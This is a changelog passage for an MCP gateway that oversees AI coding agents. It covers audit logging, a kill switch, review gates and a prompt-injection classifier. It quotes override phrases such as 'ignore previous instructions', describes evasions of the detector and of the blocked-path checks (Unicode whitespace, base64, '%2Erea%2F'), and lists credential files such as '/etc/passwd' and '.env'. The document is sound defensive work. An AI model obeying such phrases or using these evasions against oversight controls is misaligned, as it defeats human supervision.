  `rea serve` now writes a short-lived breadcrumb pidfile at `.rea/serve.pid`
  and session state at `.rea/serve.state.json` for `rea status` introspection.
  Both files are removed on graceful shutdown (SIGTERM/SIGINT). The README
  non-goal "no pid file" is narrowed to clarify that this is a read-only
  breadcrumb, not a supervisor lock — there is still no `rea start`/`rea stop`.

- 862440d: G6 — Codex install assist at init time, and pre-push hook fallback installer.

  `rea init` now probes for the Codex CLI when the chosen policy sets
  `review.codex_required: true`. If Codex is not responsive, init prints a
  clear guidance block pointing at the Claude Code `/codex:setup` helper
  instead of silently succeeding; `/codex-review` would otherwise fail later.
  In no-Codex mode the probe is skipped entirely (no wasted 2s, no confusing
  output).

  `rea init` also installs a fallback `pre-push` hook in the active git
  hooks directory when Husky is not the consumer's primary hook path. The
  fallback is a thin `exec` into `.claude/hooks/push-review-gate.sh` so
  there is still exactly one implementation of the push-review logic. The
  installer detects `core.hooksPath` correctly, refuses to stomp foreign
  hooks (no marker → leave alone), and is idempotent across re-runs.

  `rea doctor` gains a "pre-push hook installed" check that requires an
  executable pre-push at whichever path git is actually configured to fire
  (`.git/hooks/pre-push` by default, or the configured `core.hooksPath`).
  A `.husky/pre-push` alone — without `core.hooksPath=.husky` — no longer
  satisfies the check, closing the 0.2.x dogfooding gap where protected-
  path Codex audit enforcement could be silently bypassed.

  Non-goals (explicitly out of scope for G6): the `push-review-gate.sh`
  logic itself is unchanged, the protected-path regex is unchanged, and no
  middleware was moved.

- 795a8bc: G7 — Proxy-poisoning defense via TOFU fingerprints.

  The gateway now fingerprints every downstream server declared in
  `.rea/registry.yaml` on first startup and persists the result to
  `.rea/fingerprints.json` (versioned JSON, schema-validated). On every
  subsequent `rea serve`, each server is reclassified as `unchanged`,
  `first-seen`, or `drifted`:
  - **Unchanged** — proceed silently.
  - **First-seen** — LOUD stderr block announcing the new fingerprint,
    structured `tofu.first_seen` audit record, allow the connection. This
    is deliberately noisy so a poisoned registry at first install is
    visible in stderr, logs, and audit trail at the same time.
  - **Drifted** — stderr block, `tofu.drift_blocked` audit record (status
    `denied`), and the server is DROPPED from the downstream pool. Other
    servers stay up; the gateway does not fail-close on drift of a single
    server. To accept a legitimate rotation for one boot, set
    `REA_ACCEPT_DRIFT=<name>` (comma-separated for multiple).

  The fingerprint is **path-only**: `name`, `command`, `args`, sorted
  `env` KEY SET, sorted `env_passthrough`, and `tier_overrides`. Env
  VALUES are intentionally excluded so rotating a token (`GITHUB_TOKEN`
  etc.) does not trip drift. We do NOT hash the binary at `config.command`
  — that would be a slow-boot tax on every restart, legitimate MCP
  upgrades would trip false-positive drift, and host-binary compromise is
  a separate G-number, not G7. The G7 threat is YAML tampering, which the
  canonicalized config hash covers.

  A corrupt or schema-invalid `fingerprints.json` fails the gateway
  closed: we never silently reset TOFU state, because that would downgrade
  drift detection to first-seen acceptance. The operator can delete the
  file deliberately to re-bootstrap. `rea doctor` grows a `fingerprint
store` row that surfaces first-seen / drifted counts without waiting for
  `rea serve`.

- fa66785: G9 — Injection tier escalation: clean / suspicious / likely_injection.

  **Behavior change on upgrade for external profiles — read this before upgrading if you depend on the 0.2.x deny-on-any-match behavior.**

  The injection middleware (`src/gateway/middleware/injection.ts`) was a single-threshold binary: any known phrase match in a tool result denied the call. That was too blunt — a single literal match at write tier is noise-prone, while multi-literal + base64-decoded matches at any tier are near-certain attacks that should deny regardless of context. G9 introduces a three-level classifier and a policy knob governing the middle bucket.

  ### Classification rules

  Every PostToolUse scan now returns one of three verdicts (recorded in `ctx.metadata.injection` and exported to the audit log):
  - `clean` — no match → allow, no log.
  - `suspicious` — exactly ONE distinct literal pattern at write/destructive tier, with no base64-decoded match → warn (stderr + audit metadata). Whether this denies is governed by the new `policy.injection.suspicious_blocks_writes` flag.
  - `likely_injection` — any of: ≥2 distinct literal patterns, any base64-decoded match, any match at read tier, or an unknown tier (fail-closed) → **always deny, regardless of the flag**.

  ### The narrow relaxation (the reason for the loud callout)

  **In 0.2.x, a single literal match at any tier denied.** In 0.3.0, for profiles that do NOT pin the new flag (`open-source`, `client-engagement`, `minimal`, `lit-wc`, and any hand-authored policy that omits the `injection:` block), a single literal match at write/destructive tier is classified `suspicious` → warn-only by default. This means the call is ALLOWED through. The warning is written to stderr and the audit record still captures `verdict: suspicious` with the matched phrase, but the tool result is NOT blocked.

  The `bst-internal` and `bst-internal-no-codex` profiles pin `suspicious_blocks_writes: true`, preserving the 0.2.x strict-deny posture. This repo's own `.rea/policy.yaml` continues to inherit that strict posture by profile.

  **Why ship narrower:** silent tightening on upgrade is a worse footgun than the narrower default. External consumers who want the strict 0.2.x behavior can opt in explicitly:

  ```yaml
  injection:
    suspicious_blocks_writes: true
  ```

  `likely_injection` remains an unconditional deny. The attacker cases that matter most (multi-pattern coordinated injection, base64-obfuscated payloads) still deny in every profile.

  ### Policy flag

  New optional top-level policy block:

  ```yaml
  injection:
    suspicious_blocks_writes: true # default: false
  ```

  - `false` (schema default): `suspicious` → warn-only, tool result allowed through. Audit record carries `verdict: suspicious`.
  - `true`: `suspicious` → deny at write/destructive tier (matches 0.2.x deny-on-literal semantics for writes). Audit record carries `verdict: suspicious` plus `status: denied`.
  - `likely_injection` denies in either case.

  The loader defaults are `false`; the `bst-internal*` profiles pin `true`.

  ### Audit metadata

  On any non-clean verdict the middleware writes `ctx.metadata.injection`, which the audit middleware exports verbatim into the per-call record:

  ```json
  {
    "verdict": "likely_injection",
    "matched_patterns": ["disregard your", "ignore previous instructions"],
    "base64_decoded": false
  }
  ```

  `matched_patterns` is a sorted list of distinct phrase strings from the built-in phrase list. NO input payload text is ever written to metadata (guard against leaking the attack content through audit trail redaction bypass).

  ### Legacy `injection_detection: warn` interaction

  Operators who pinned 0.2.x `injection_detection: warn` continue to get warn-only for `suspicious`. However, under G9, `likely_injection` (multi-literal or base64-decoded) will now DENY even when `injection_detection: warn` is set. This is a narrow tightening for operators who explicitly pinned warn mode — the classifier's whole value is distinguishing high-confidence attacks from ambiguous single-hits, and high-confidence attacks deserve a deny. If you need the full-allow-through behavior for all matches (not recommended), disable the middleware by removing it from your gateway configuration.

  ### Stderr format change

  The warning line format changed from `[rea] INJECTION-GUARD: ...` to `[rea] INJECTION-GUARD (<verdict>): ...`. Log consumers grepping for the old exact prefix should update their filters.

  ### Pattern list unchanged

  This PR does NOT modify the built-in `INJECTION_PHRASES` list. Extending or reshaping the pattern set is explicit future work (a per-pattern "deny-tag" extension point is stubbed with a TODO in `classifyInjection`).

  ### New public exports

  From `src/gateway/middleware/injection.ts`:
  - `classifyInjection(scan, tier) → InjectionClassification` — pure classifier
  - `scanStringForInjection(s, result, safe)` / `scanValueForInjection(v, result, safe)` — structured scanners
  - `decodeBase64Strings(input: unknown) → string[]` — pure base64 probe
  - `INJECTION_METADATA_KEY` — `'injection'`, the ctx.metadata key for the verdict record
  - `InjectionClassifierMetadata`, `InjectionScanResult`, `InjectionClassification` — types

  Back-compat: `scanForInjection(string, safe) → string[]` is retained as a wrapper so `scripts/lint-safe-regex.mjs` and any external consumer that imported it continue to work.

### Patch Changes

- 6a2f00c: ci: tarball smoke workflow (packaging regression gate)

  Adds `scripts/tarball-smoke.sh`, invoked on every PR and every push to `main` via a new `Tarball smoke` CI job, and re-invoked in the release workflow immediately before `changeset:publish`. The script packs the repo with `pnpm pack`, installs the resulting tarball in an isolated tempdir, and asserts:
  - `rea --version` matches `package.json` version
  - `rea --help` prints the full command tree
  - `rea init --yes --profile open-source` creates the expected layout
  - `rea doctor` returns OK on the freshly installed artifacts
  - At least 10 agents and 13 hooks shipped in the tarball
  - Every public ESM export (`.`, `./policy`, `./middleware`, `./audit`) resolves

  This catches packaging regressions — missing files from the `files:` allow-list, broken `exports` map, shebang / chmod issues on `bin/rea`, postinstall failures, dependency-resolution drift — before the tarball reaches npm. No runtime behavior change.

  Branch protection on `main` should be updated to include `Tarball smoke` as a required check alongside the existing seven.

- 52e655d: fix(gateway/blocked-paths): restore absolute-path matching and close content-key + URL-escape bypasses

  Address three post-merge Codex findings on BUG-001:
  - **[critical]** Absolute `blocked_paths` entries (e.g. `/etc/passwd`) no longer matched after the content-substring narrowing — restored.
  - **[high]** `CONTENT_KEYS` blanket skip on `name/value/label/tag/tags/title` let `{name: ".env"}` bypass — now only skipped when value is not path-shaped.
  - **[high]** Malformed `%XX` URL-escape silently disabled decode, enabling `.rea/` trust-root bypass via `%2Erea%2F` — now fails closed on malformed escapes.

- 1e1f247: fix(gateway): G5 observability — post-merge Codex blocker sweep. Eight
  BLOCKING findings from adversarial review of the G5 feature (merged as
  PR #22) are resolved ahead of 0.4.0:
  - **metrics bind allowlist (security).** `startMetricsServer` now validates
    the `host` option against a strict loopback allowlist (`127.0.0.1`,
    `::1`). Anything else — `localhost`, `0.0.0.0`, `::`, any LAN IP — throws
    a `TypeError` BEFORE a socket is opened. Closes the path where a caller
    could accidentally expose the unauthenticated `/metrics` endpoint to
    the network. A test-only `__TEST_HOST_OVERRIDE` symbol preserves the
    hostname-resolution test path; the symbol is unreachable from YAML,
    JSON, or CLI deserialization.
  - **pid/state breadcrumb race.** `rea serve` now writes `.rea/serve.pid`
    and `.rea/serve.state.json` atomically (stage-to-temp + `rename(2)`)
    and cleans them up only when the file still carries this process's pid
    (pidfile) or session id (state). Two overlapping `rea serve`
    invocations in the same `baseDir` no longer clobber each other's
    breadcrumbs on the first instance's shutdown.
  - **ANSI/OSC escape injection in `rea status` pretty mode.** Every
    disk-sourced string field (`profile`, `autonomy_level`, `halt_reason`,
    `session_id`, `started_at`, `last_timestamp`) is scrubbed through a
    new `sanitizeForTerminal` helper before reaching the operator's
    terminal. C0 control bytes (0x00-0x1F) and DEL (0x7F) are replaced
    with `?` — the ESC byte that initiates CSI/OSC sequences and the BEL
    byte that terminates OSC 8 hyperlinks are both scrubbed. JSON mode
    output is untouched (JSON.stringify already escapes safely).
  - **observability counter wiring.** `createAuditMiddleware` and
    `createKillSwitchMiddleware` now accept an optional `MetricsRegistry`.
    The audit middleware increments `rea_audit_lines_appended_total` on
    every successful fsynced append; the kill-switch middleware refreshes
    `rea_seconds_since_last_halt_check` on every invocation (previously
    the gauge only reflected the startup-time mark). `rea serve` wires
    the same registry into both. Counter failures never crash the chain.
  - **log-field redaction.** The gateway logger now accepts an optional
    `redactField` hook applied to every string-valued field before
    serialization. `rea serve` installs a redactor compiled from the
    same `SECRET_PATTERNS` the redact middleware uses, so downstream
    error messages that carry env var names, argv fragments, or file
    paths with credential material reach stderr already scrubbed. A
    redactor that throws falls back to `[redactor-error]` per field —
    the record itself is never dropped.
  - **bounded-memory audit tail.** `rea status` no longer reads the
    whole `audit.jsonl` into a buffer to count lines or find the last
    record. Line count uses a streaming 64-KiB-chunk scan; the last
    record is sourced from a positioned 64-KiB tail-window read. On
    multi-hundred-MB chains the memory footprint is bounded to the
    window size plus the scan buffer.
  - **bounded metrics `close()`.** `startMetricsServer` tracks every
    live socket and guarantees `close()` resolves within 2 s even when
    a Prometheus scraper is holding a keep-alive connection open. On
    deadline the server calls `closeIdleConnections()` (Node 18.2+)
    and destroys any surviving tracked sockets. The timer is `unref`'d
    so it never holds the process open.
  - **pretty-mode cyclic-safe serialization.** Pretty-mode logger extras
    that contain a cyclic reference no longer drop the entire record.
    A safe-stringify wrapper substitutes a stable `[unserializable]`
    placeholder so the operator still sees the event, level, and
    message.

- b6a69ff: fix(cli): harden pre-push fallback installer (G6 post-merge hardening)

  Close four classification/write-path issues in the G6 pre-push fallback installer: existence-only skip bypass (doctor pass on foreign hooks), classify/write TOCTOU, substring `FALLBACK_MARKER` collision, and deterministic tmp-filename collisions.

- 795a8bc: docs(registry/tofu): tighten rename-bypass defense scope

  Clarify in `classifyServers` that the set-difference heuristic catches **rename-with-removal** (attacker removes old trusted entry at the same moment the tampered new entry appears), not rename-with-placeholder (attacker leaves old entry in place as a decoy, adds tampered new entry under a new name).

  Rename-with-placeholder lands as `first-seen` with a LOUD stderr banner — the documented, intentional TOFU contract for new entries. No code change; the docstring previously oversold the defense's scope.

- a5cca2a: fix(injection): guard base64 probe on timeout + correct changeset default-behavior doc

  Address four post-merge Codex findings on the G9 three-tier injection classifier (PR #25):
  - **[high]** `denyOnSuspicious` flag behavior clarified: the `suspicious_blocks_writes` flag defaults to `false` when omitted (preserving the 0.3.x warn-only default for unset installs). Consumers who want the tighter block posture must opt in explicitly with `injection.suspicious_blocks_writes: true`. The `bst-internal*` profiles pin `true`. This was the correct approach: silently switching to block behavior on upgrade would be a breaking change for 0.3.x consumers.
  - **[high]** The 7-phrase ASCII pattern library was trivially bypassed by Unicode whitespace (NBSP, en-space, em-space, ideographic space, etc.), zero-width joiners, and fullwidth compatibility characters. Inputs are now NFKC-normalized, zero-width-stripped, Unicode-whitespace-collapsed, and lowercased before literal matching. The phrase library was also modestly expanded with two conservative persona-swap vectors (`pretend you are`, `roleplay as`). Broader candidates like `act as a` / `act as an` were considered but dropped: at read tier a single literal match escalates to `likely_injection`, which would falsely deny benign prose such as "this proxy can act as a bridge." Pattern-set extensibility via policy is filed as G9.1 follow-up.
  - **[medium]** `decodeBase64Strings` was exported and tested but never wired into the middleware execution path — 28 lines of dead code advertised as a second-opinion base64 probe. It is now called from the middleware after the primary scan; any phrase detected in a decoded whole-string payload is merged into `base64DecodedMatches`, triggering classification rule #2 (`likely_injection`). The call is guarded behind `!scanTimedOut` so a timeout-induced incomplete scan cannot force unbounded CPU/memory in the base64 probe path; a `MAX_BASE64_PROBE_LENGTH` cap (16 KiB) is also applied per-string inside `decodeBase64Strings`.
  - **[low]** On worker-bounded regex timeout, the audit record carried timing metadata under `injection.regex_timeout` but no `verdict` field under `injection`. A new `verdict: 'error'` value is emitted when a timeout produces no actionable signal, giving downstream audit consumers a stable record shape. A new `InjectionMetadataSchema` zod schema is exported from the injection middleware module for internal test coverage; promoting it to a public package entrypoint is tracked as G9.2 follow-up (the module is not reachable via the current `exports` map, so do not rely on it from outside this repo yet).

  `likely_injection` continues to deny unconditionally in all configurations.

- 4f4d19d: ci: close tarball-smoke coverage gaps (post-merge)

  Address four post-merge Codex findings on the tarball-smoke gate:
  - **[high]** Gate counted `.claude/agents/` + `.claude/hooks/` only — now tree-equality asserts against `.claude/commands/`, recursive `hooks/**` (walks `hooks/_lib/`), and the shipped `.husky/{commit-msg,pre-push}` so a tarball missing those surfaces fails loud with a unified-diff delta. `.git/hooks/{commit-msg,pre-push}` are also asserted as the real enforcement surface on a fresh consumer.
  - **[medium]** Fresh-consumer `npm init -y` temp files were not actually cleaned before `git init` — comment now matches behavior (`rm -f package.json package-lock.json`).
  - **[low]** Version probe interpolated repo path into a JS string literal — now passes the path via argv so repo-roots with apostrophes, backslashes, or `${...}`-style expansions do not break the require() call.
  - **[low]** Cleanup trap bound to `EXIT` only — now catches `HUP`/`INT`/`TERM` so Ctrl-C during a local run does not leave `/tmp/rea-smoke-*` tempdirs behind.

- c0b8a2b: fix(gateway/blocked-paths): eliminate content-substring false positives (BUG-001)

  The blocked-paths middleware previously substring-matched policy patterns against every string value in the argument tree, including free-form `content` and `body` fields. A secondary fallback stripped the leading `.` from patterns like `.env`, which caused the naked substring `env` to match inside any string containing "environment" — breaking legitimate note creation on Helix (`obsidian__create-note` with 14 KB of prose that mentioned GitHub Environments and `.env` files in passing).

  The matcher is now key-aware and path-segment aware:
  - Arguments with a known path-like leaf key (`path`, `file_path`, `filename`, `folder`, `dir`, `src`, `dst`, `target`, …) are always scanned.
  - Arguments with a content-like leaf key (`content`, `body`, `text`, `message`, `description`, `summary`, `title`, `query`, `prompt`, `comment`, …) are never scanned, regardless of how the value looks.
  - Arguments with any other key are scanned only when the value looks like a filesystem path (contains a separator, starts with `~`, is a dotfile, or matches a Windows drive prefix).
  - Pattern matching is strictly path-segment aware; `*` and `?` are single-segment globs (they do not cross `/`), and all other regex metacharacters in a pattern are escaped. Trailing `/` on a pattern means "this directory and everything under it".
  - `.rea/` is still unconditionally enforced regardless of policy.

  The policy file format is unchanged. Existing installs that list both `.env` and `.env.*` in `blocked_paths` continue to block every `.env` variant. If a policy previously relied on accidental substring matching (e.g., listing only `.env` and expecting `.env.local` to be blocked), add `.env.*` explicitly — this is how the `bst-internal` profile already works.

- c4c4cc8: fix(cli): correct `rea serve` help description — the serve command is no longer a stub. Also refresh `.rea/install-manifest.json` to reflect the post-G10/G1 content hashes for `.claude/hooks/push-review-gate.sh` and `.husky/pre-push`.

## 0.3.0

### Minor Changes

- 6c1b53c: G1 — Audit durability + rotation.

  Every append to `.rea/audit.jsonl` now takes a `proper-lockfile` lock on `.rea/`
  before the read-last-record → compute-hash → append → fsync sequence. The lock
  covers both write paths: the gateway audit middleware and the public
  `@bookedsolid/rea/audit` helper. Stale locks are reclaimed after 10s
  (`proper-lockfile` default), and lock-acquisition failure in the gateway path
  falls back to the pre-0.3.0 behavior (stderr warn, tool call proceeds) — an
  audit outage must not take down the gateway.

  Size- and age-based rotation lands behind a new optional policy block:

  ```yaml
  audit:
    rotation:
      max_bytes: 52428800 # 50 MiB (default when the block is present)
      max_age_days: 30 # default when the block is present
  ```

  Back-compat is preserved: if an install has no `audit.rotation` block, rotation
  is a no-op and behavior is identical to 0.2.x. Defaults only apply once the
  operator has opted in by declaring the block.

  Rotation renames the current file to `audit-YYYYMMDD-HHMMSS.jsonl` and seeds
  the fresh `audit.jsonl` with a single rotation marker record
  (`tool_name: "audit.rotation"`) whose `prev_hash` is the SHA-256 of the last
  record in the rotated file. This marker is the chain bridge — an operator
  verifying the chain with `rea audit verify --since <rotated>` walks rotated
  → marker → current without a break.

  Two new CLI subcommands:
  - `rea audit rotate` — force-rotate now. Empty files are a deliberate no-op.
  - `rea audit verify [--since <rotated-file>]` — re-hash the chain; exits 0 on
    clean, 1 naming the first tampered record. `--since` walks forward through
    all rotated predecessors in timestamp order.

  Partial-write recovery: a crash that leaves a trailing line without a newline
  is detected on the next read (`readLastRecord`), the partial tail is
  truncated, and appends resume cleanly.

  Tests (31 new, 278 total):
  - Tamper detection — flip a byte in a rotated file, verify exits 1 and
    stderr names the offending record index.
  - Crash recovery — partial-line tail is truncated; next append chains on
    the recovered head.
  - Cross-process concurrency — two Node processes appending 50 records each
    produce a linear 100-record chain with no duplicate `prev_hash` values.
  - Rotation boundary — size trigger rotates with operator-supplied
    `max_bytes: 1024`; fresh file starts with a rotation marker whose
    `prev_hash` equals the rotated file's tail hash.
  - Empty-rotation — `rea audit rotate` on an empty/missing audit log is a
    no-op (no rotated file created).
  - Happy-path verify — 20 clean appends → `rea audit verify` exits 0.
  - Schema — `audit.rotation.{max_bytes, max_age_days}` round-trips; unknown
    fields are rejected under strict mode; non-positive thresholds rejected.

  Dependencies: `proper-lockfile@^4.1.2` added to `dependencies` (NOT
  devDependencies — this is a runtime import). `@types/proper-lockfile@^4.1.4`
  added to `devDependencies`.

### Patch Changes

- f6193c5: Refresh `THREAT_MODEL.md` to 0.2.x.

  Reflects the 0.2.0 MVP that shipped: gateway middleware chain, G3 ReDoS
  worker-thread timeout, G4 HALT single-syscall atomicity, G11.1–G11.5
  Codex resilience (escape hatch, pluggable reviewer, availability probe,
  first-class no-Codex mode, reviewer telemetry), and G12 install manifest
  - upgrade command + drift detection. Adds three new attack-surface
    sections — §5.11 downstream subprocess environment inheritance,
    §5.12 regex denial-of-service, §5.13 installer path trust — and updates
    the residual-risk table with 0.3.0 tracking pointers.

  Doc-only; no runtime change.

## 0.2.1

### Patch Changes

- 6f38d99: Move `safe-regex` from devDependencies to dependencies.

  `src/policy/loader.ts` imports `safe-regex` at runtime (the G3 ReDoS
  load-time validation on user-supplied redact patterns), but the dep was
  declared devOnly in 0.2.0. The published 0.2.0 tarball is unusable in
  consumer projects — `node dist/cli/index.js` fails with
  `ERR_MODULE_NOT_FOUND: Cannot find package 'safe-regex'`. This patch
  restores a working install.

## 0.2.0

### Minor Changes

- 320c090: 0.2.0 MVP — gateway end-to-end, install completeness, Codex governance.

  ## Track 1 — Gateway MVP (`rea serve`)

  `rea serve` is now a real MCP gateway. It loads `.rea/policy.yaml` and
  `.rea/registry.yaml`, spawns downstream MCP servers over stdio, and proxies
  every tool call through the full 10-layer middleware chain (audit,
  kill-switch, tier, policy, blocked-paths, rate-limit, circuit-breaker,
  injection, redact, result-size-cap). A gateway with zero downstream servers
  boots cleanly and advertises an empty catalog — first-run does not crash.

  New modules:
  - `src/registry/{types,loader}.ts` — zod-validated registry with TTL + mtime cache
  - `src/gateway/{downstream,downstream-pool,server,session}.ts` — upstream Server, per-server Client connections, `<serverName>__<toolName>` prefix routing, one-shot reconnect semantics
  - `src/cli/serve.ts` — rewritten from stub; SIGTERM / SIGINT graceful drain
  - Smoke tests via `InMemoryTransport` covering zero-server mode, HALT denial, and tier classification

  ## Track 2 — `rea init` completeness

  `rea init` now actually installs rea into a consumer project:
  - `src/cli/install/copy.ts` — copies `hooks/**`, `commands/**`, `agents/**` into `.claude/`, chmods hooks `0o755`, conflict policy (`--force` overwrites, `--yes` skips existing, interactive prompt otherwise)
  - `src/cli/install/settings-merge.ts` — atomic merge into `.claude/settings.json`; never silently overwrites consumer hooks; warns only when chaining onto pre-existing matchers
  - `src/cli/install/commit-msg.ts` — belt-and-suspenders install of `.git/hooks/commit-msg` (and `.husky/commit-msg` when husky is present); respects `core.hooksPath`
  - `src/cli/install/claude-md.ts` — managed fragment inside `CLAUDE.md` delimited by `<!-- rea:managed:start v=1 -->` / `<!-- rea:managed:end -->`; content outside the markers is never touched
  - `src/cli/install/reagent.ts` — field-for-field translator with copy / drop / ignore lists; drop-list fields refuse translation without `--accept-dropped-fields` to prevent silent security downgrades; autonomy clamped to profile ceiling
  - `src/policy/profiles.ts` + `profiles/*.yaml` — layered merge `hardDefaults ← profile ← reagentTranslation ← wizardAnswers`; ships seven profiles (`minimal`, `bst-internal`, `bst-internal-no-codex`, `open-source`, `open-source-no-codex`, `client-engagement`, `lit-wc`)
  - New flags on `rea init`: `--force`, `--accept-dropped-fields`, `--codex`, `--no-codex`
  - `rea doctor` expanded to 9 checks (agents count, hook executability, settings matchers, commit-msg hook, codex agent + command, registry parse); when `review.codex_required: false`, the Codex-specific checks collapse to a single informational line

  ## Track 3 — Codex governance
  - `src/gateway/middleware/audit-types.ts` + `audit.ts` — optional `metadata` field on audit records, emitted when `ctx.metadata` carries caller-supplied keys (the internal `autonomy_level` key is kept private to the audit bookkeeping)
  - `src/audit/append.ts` — public helper exported as `@bookedsolid/rea/audit`; reads tail for `prev_hash`, computes SHA-256, appends atomically with fsync; usable by the `codex-adversarial` agent and by consumers emitting their own events (`helix.plan`, `helix.apply`)
  - `src/audit/codex-event.ts` — single source of truth for the `codex.review` event shape shared between the TS helper and `hooks/push-review-gate.sh`
  - `hooks/push-review-gate.sh` — on diffs that touch `src/gateway/middleware/`, `hooks/`, `src/policy/`, or `.github/workflows/`, the push is blocked unless `.rea/audit.jsonl` contains a `codex.review` entry for the current HEAD
  - `agents/codex-adversarial.md` — documents the structured audit-append step

  ## Codex dependency resilience (G11.1 pulled from 0.3.0)
  - `hooks/push-review-gate.sh` gained an audited escape hatch: setting
    `REA_SKIP_CODEX_REVIEW` to a non-empty reason bypasses the Codex
    audit-record requirement and writes a `codex.review.skipped` entry to
    `.rea/audit.jsonl` (head_sha, reason verbatim, actor from `git config`,
    verdict, files_changed). Event name is deliberately distinct from
    `codex.review` so future pushes on the same HEAD cannot consume a skip
    record to satisfy the Codex-review requirement.
  - Fail-closed on missing `dist/audit/append.js`, missing git identity, and
    any audit-append error. Never-silent: a banner prints to stderr on every
    use. 8 behavioral tests cover the contract.

  ## Pluggable reviewer (G11.2)
  - `src/gateway/reviewers/{types,codex,claude-self,select}.ts` — single
    `AdversarialReviewer` interface with two concrete implementations and a
    selector that reads both `REA_REVIEWER` and `.rea/registry.yaml`
    reviewer pin. `ClaudeSelfReviewer` is the fallback when Codex is
    unreachable.
  - `src/policy/types.ts` + `loader.ts` — adds `review.codex_required?`
    with strict-mode validation, so a typo fails loudly at load time
    instead of silently defaulting.

  ## Codex availability probe (G11.3)
  - `src/gateway/observability/codex-probe.ts` — `CodexProbe` class that
    polls `codex --version` (2s timeout) and a best-effort catalog
    subcommand (5s timeout) and exposes a typed `CodexProbeState`. The
    probe is decoupled from reviewer selection — it reports state only,
    it never gates a review. Polling runs on a `setInterval` that is
    `.unref()`'d so the probe never keeps the event loop alive.
  - `getState()` never throws; `probe()` is safe to call concurrently
    (overlapping callers share a single in-flight exec); `onStateChange`
    fires only on real transitions.
  - The probe treats an unrecognized `catalog --json` subcommand as a
    degraded-skip, not as a hard failure. Documented assumption: we are
    blocking on whether the CLI responds at all, not on whether OpenAI
    ships that exact subcommand.
  - `src/cli/serve.ts` runs an initial probe on startup when
    `policy.review.codex_required` is not explicitly `false`. A failed
    probe emits a single stderr warn — startup NEVER fail-closes on a
    Codex miss — and then the periodic poll takes over. `stop()` runs on
    SIGTERM / SIGINT alongside the gateway drain.
  - `src/cli/doctor.ts` runs a one-shot probe (when Codex is required)
    and adds `codex.cli_responsive` (pass/warn) and `codex.last_probe_at`
    (info) rows to the doctor output. Probe failure surfaces as a warn,
    never a hard fail — consistent with the existing Codex-optional
    checks.

  ## Reviewer telemetry (G11.5)
  - `src/gateway/observability/codex-telemetry.ts` — append-only
    observational metrics at `<baseDir>/.rea/metrics.jsonl`. Each row
    captures `invocation_type`, estimated input/output tokens
    (chars / 4), `duration_ms`, `exit_code`, and `rate_limited` (detected
    from stderr via a case-insensitive regex covering 429, "rate limit",
    "usage limit", "exceeded quota").
  - **Never stores payloads.** The `input_text` and `output_text` fields
    on the call-site input are consumed once for token estimation and
    discarded. A unit test asserts marker strings never appear in the
    file. This is non-negotiable per the brief — telemetry is numbers,
    not content.
  - Fail-soft writes: any I/O error surfaces as a single stderr warning
    and resolves without throwing. Telemetry must never interfere with
    the reviewed operation.
  - `summarizeTelemetry(baseDir, windowDays = 7)` buckets records by
    local-tz day, most-recent first, and returns a fixed shape
    (`invocations_per_day`, `total_estimated_tokens`,
    `rate_limited_count`, `avg_latency_ms`). Missing file → all-zero
    summary with no throw.
  - `ClaudeSelfReviewer.review()` is now instrumented via an internal
    `emitTelemetry` helper that contains both sync throws and async
    rejections from a misbehaving injected telemetry fn. The success,
    API-error, and unparseable-output paths each write exactly one row;
    the "no API key" short-circuit is deliberately NOT instrumented
    (there's no SDK call to measure).
  - `CodexReviewer.review()` intentionally remains uninstrumented — it
    throws today (the real path goes through the `codex-adversarial`
    agent); a TODO comment references the 0.3.0 work where Codex runs
    from TS.
  - `rea doctor --metrics` prints a compact 7-day summary after the
    existing checks. The flag never contributes to the exit code — it is
    purely observational.

  ## First-class no-Codex config (G11.4)
  - `hooks/push-review-gate.sh` now honors `review.codex_required: false`
    and skips the protected-path Codex audit-record requirement in that
    mode. `REA_SKIP_CODEX_REVIEW` becomes a no-op under no-codex (skipping
    a review that isn't required is not meaningful, and no skip record
    is emitted).
  - `src/scripts/read-policy-field.ts` — tiny standalone helper that
    exposes a single scalar policy field to shell hooks without importing
    the full CLI surface. Exit codes distinguish field-missing (1) from
    policy-malformed (2); the push gate fails closed on any helper error
    (treat as `codex_required: true`).
  - `src/cli/doctor.ts` — the two Codex-specific checks are replaced by a
    single `info` line when `codex_required: false`. The curated-agents
    roster still expects `codex-adversarial.md` so flipping the flag back
    does not require a re-install. New `info` status kind for purely
    advisory lines that never contribute to the doctor exit code.
  - `rea init` — new `--codex` / `--no-codex` flags. The written
    `.rea/policy.yaml` always emits an explicit `review.codex_required`
    value. Wizard prompts with the flag or profile-derived default; `--yes`
    honors the flag directly. When the resolved value is false, a durable
    notice prints pointing at the exact knob to flip.
  - `profiles/bst-internal-no-codex.yaml` and
    `profiles/open-source-no-codex.yaml` — new variants whose name causes
    the init flow to default `codex_required: false`. Leading comment on
    each documents when to pick the variant and how to re-enable Codex.
  - 18 new tests across
    `__tests__/hooks/push-review-gate-no-codex.test.ts`,
    `src/cli/doctor.test.ts`, and `src/cli/init.test.ts` exercise the
    no-codex path, profile-name defaults, fail-closed on malformed policy,
    and policy-round-trip via the strict loader.

  ## HALT atomicity (G4)
  - `src/gateway/middleware/kill-switch.ts` — rewritten to issue exactly ONE
    syscall per invocation on `.rea/HALT` (`fs.open(path, O_RDONLY)`). The
    previous `stat` → `lstat` → `open` sequence had a TOCTOU window between
    the check and the read; the new implementation has none.
  - **Semantic guarantee:** HALT is evaluated exactly once per invocation, at
    chain entry. A call that passes that check runs to completion; a call that
    fails it is denied. Creating `.rea/HALT` mid-flight does **not** cancel
    in-flight invocations — it blocks _subsequent_ invocations only. This
    matches standard kill-switch semantics (SIGTERM after acceptance: the
    process continues).
  - **Fail-closed on unknown state:** `ENOENT` → proceed; any other errno
    (`EACCES`, `EPERM`, `EISDIR` on some platforms, `EIO`, …) → deny.
  - **Observability:** decision recorded on `ctx.metadata.halt_decision`
    (`absent` / `present` / `unknown`) and `ctx.metadata.halt_at_invocation`
    (ISO-8601 timestamp when HALT was present, else `null`). The audit
    middleware already forwards arbitrary `ctx.metadata` keys into the
    hash-chained record, so `halt_decision` appears on every audit row.
  - Six new tests in `src/gateway/middleware/kill-switch.test.ts` cover:
    mid-flight HALT creation, mid-flight HALT removal, per-invocation decision
    isolation, ENOENT regression, non-`ENOENT` errno fail-closed, and a
    10-invocation concurrency matrix across a HALT toggle.

  ## ReDoS safety (G3)

  Every regex that the middleware chain runs on untrusted MCP payloads is
  now bounded by a per-call wall-clock timeout. Defense-in-depth: static
  lint at build time, load-time safe-regex validation on user-supplied
  patterns, and a runtime timeout that hard-kills a catastrophic
  backtracker before it can hang the gateway.
  - `src/gateway/redact-safe/match-timeout.ts` — `wrapRegex(pattern, opts)`
